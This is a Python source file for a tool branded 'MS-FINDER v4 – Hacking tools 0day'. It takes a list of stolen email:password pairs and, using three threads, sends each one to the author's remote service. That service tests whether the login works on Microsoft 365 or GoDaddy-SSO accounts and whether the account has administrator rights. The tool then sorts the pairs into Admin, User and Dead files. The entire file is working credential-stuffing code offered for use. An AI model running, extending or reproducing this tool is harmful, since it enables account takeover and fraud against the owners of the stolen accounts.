#!/usr/local/bin/python
# -*- coding: utf-8 -*-

import os , time , json , platform
from datetime import date
from threading import *

try:
	import requests
except:
	print( "Please follow this command or contact me ! 'pip install requests' OR 'python3 install requests' ")
	exit()

try:
	from queue import Queue
except:
	print( "Please follow this command or contact me ! 'pip install queue' OR 'python3 install queue' ")
	exit()

def Logo( ):
    print("""
    ***************************************************************
	  __  __  _____       ______ _____ _   _ _____  ______ _____  
	 |  \/  |/ ____|     |  ____|_   _| \ | |  __ \|  ____|  __ \ 
	 | \  / | (___ ______| |__    | | |  \| | |  | | |__  | |__) |
	 | |\/| |\___ \______|  __|   | | | . ` | |  | |  __| |  _  / 
	 | |  | |____) |     | |     _| |_| |\  | |__| | |____| | \ \ 
	 |_|  |_|_____/      |_|    |_____|_| \_|_____/|______|_|  \_\ v4
																						 
		Hacking tools - 0day , Welcome User {} !
    
    ***************************************************************
    """.format( USERNAMEHANYA )  )


class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try:
				func(*args, **kargs)
			except Exception as e:
				print(e)
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

def set_terminal_title(title):
    if platform.system() == "Windows":
        os.system(f"title {title}")
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        os.system(f"echo -en '\033]0;{title}\a'")
    elif platform.system() == "SunOS":
        os.system(f"echo -n '\033]l{title}\033\\'")
    elif platform.system() == "FreeBSD":
        os.system(f"echo -n '\033]0;{title}\007'")
    elif platform.system() == "AIX":
        os.system(f"echo -n '\033]0;{title}\007'")
    elif platform.system() == "HP-UX":
        os.system(f"echo -n '\033]0;{title}\007'")
    elif platform.system() == "OSF1":
        os.system(f"echo -n '\033]0;{title}\007'")
    elif platform.system() == "SCO_SV":
        os.system(f"echo -n '\033]0;{title}\007'")
    elif platform.system() == "IRIX64":
        os.system(f"echo -n '\033]0;{title}\007'")

def make_dirs():
	global i , USERNAMEHANYA , MySubDomain
	
	
	set_terminal_title( "ADMIN FINDER V4 -- BY HACKING TOOLS 0DAY" )

	try:
		with open('token.json', 'r') as file:
			data = json.load(file)
			USERNAMEHANYA = data['USERNAME']
			MySubDomain = data['MySubDomain']
	except:
		print( "Missing token.json !" )
		exit()
	
	rr = requests.get( "{}/{}/ChecksTatus".format( MySubDomain , USERNAMEHANYA ) , headers={ "User-agent": "User-%s" % USERNAMEHANYA } ).json()
			
	Logo( )

	if not rr["Working"]:
		
		print("Sorry , {} , Please Cotact me !".format( rr["Status"] ) )
		exit()
		
	else:
		pass
	
	i = "./{0}/".format( date.today().strftime("MS-%m-%d-%Y") )
	
	if not os.path.exists(i):
		os.makedirs(i)
		
		lists = [ "Microsoft/Administrator/" ,"Microsoft/User/" ,"Microsoft/Dead/" , "OtherISP/" ]
		for n in lists:
			z = i + n
			os.makedirs( z )
			
		return i
	else:
		pass
		
	time.sleep(1)

def Action( combo ):
	
	def save_as( inputs  , saveAs , saveString ):
		with open( saveAs , "a" ) as ff:
			ff.write( "%s\n" % saveString )
		print( inputs )

	def REQ_( email , password = None ,  Endpoint="Ms-Domain" , USERNAME=USERNAMEHANYA ):
		
		if not password:
			return requests.get( "{3}/{2}/{1}/{0}".format( email , Endpoint , USERNAME , MySubDomain ) , headers={ "User-agent": "User-%s" % USERNAME } , timeout=60 )
		else:
			return requests.post( "{}/{}/{}".format( MySubDomain , USERNAME , Endpoint ) , headers={ "User-agent": "User-%s" % USERNAME , "Content-Type" : "application/json" } , json={ "email" : email , "password" : password } , timeout=60 )


	def Q_MS( combo ):

		CheckGoddadyLogin = "CheckGoddadyLogin" # Check if Goddady # Check if Admin Goddady  # Action 2
		AdminFinderGoddady = "AdminFinderGoddady" # Check if Admin Goddady  # Action 3
		AdminFinderGlobal = "AdminFinderGlobal" # Check if Admin Goddady # Check if Admin Goddady  # Action 4

		email , password = combo.split(":")
		if "@" in email:
			
			First_ = REQ_( email ).json()
			
			if First_["Valid"]:
				if "sso.godaddy".__eq__( First_["Type_domain"] ): # check if it's a valid Email Goddady on Microsoft 
				
					SECOND_ = REQ_( email , password , CheckGoddadyLogin ).json() # check if it's a valid Login Access Goddady on Microsoft 
					if SECOND_["Working"]:
						
						THIRD_ = REQ_( email , password , AdminFinderGoddady ).json() # check if it's a valid Admin Access Goddady on Microsoft 
						
						if THIRD_["Admin"]:
							save_as( "[x] >>>>> Admin GOddady >>>> {}".format( email ) , "{}{}Godaddy__ADMIN.txt".format( i , "Microsoft/Administrator/" ) , combo  )
						else:
							save_as( "[x] >>>>> User GOddady >>>> {}".format( email ) , "{}{}Godaddy__USER.txt".format( i , "Microsoft/User/"  )  , combo  )
					else:
						save_as( "[-] >> Ded GOddady >> {}".format( email ) , "{}{}Godaddy__DEAD.txt".format(  i , "Microsoft/Dead/"  )  , combo  )
				else:
					FOURTH_ = REQ_( email , password , AdminFinderGlobal ).json() # check if it's a valid Admin Normal or Other accounts.
					
					if FOURTH_["Admin"]:
						save_as( "[x] >>>>> Admin {} >>>> {}".format( email , First_["Type_domain"] )  , "{}{}{}__ADMIN.txt".format( i , "Microsoft/Administrator/" , First_["Type_domain"] ) , combo  )
					elif FOURTH_["User"]:
						save_as( "[x] >>>>> USER {} >>>> {}".format(  email , First_["Type_domain"] )  , "{}{}{}__USER.txt".format(  i , "Microsoft/User/" , First_["Type_domain"] ) , combo  )
					else:
						save_as( "[-] >> DEAD {} >> {}".format( email , First_["Type_domain"] )  , "{}{}{}__DEAD.txt".format( i , "Microsoft/Dead/" ,  First_["Type_domain"] ) , combo  )
			else:
				save_as( "[-] >> OTHER ISP {} >> {}".format( email , First_["Type_domain"] )  , "{}{}{}__DEAD.txt".format( i , "OtherISP/" ,  First_["Type_domain"] ) , combo  )
			
			
		else:
			pass

		

	Q_MS( combo  )
	# ~ set_terminal_title( "MS ADMIN [{}] USER [{}] Goddady [{}] GoddadyADMIN [{}] -- BY HACKING TOOLS 0DAY".format( ADMINWORKING__ , USER_WORKING__ , GOODADDY_USER_WORKING__ , GOODADDY_ADMIN_WORKING__ ) )

def main():
	make_dirs()

	readsplit = open( input("Please Give Me ListName : ") , encoding="utf-8" , errors="ignore" ).read().splitlines()
	pool = ThreadPool( int( 3 ) )
	for combo in readsplit:
		pool.add_task( Action , combo )

if __name__ == "__main__":
	main()
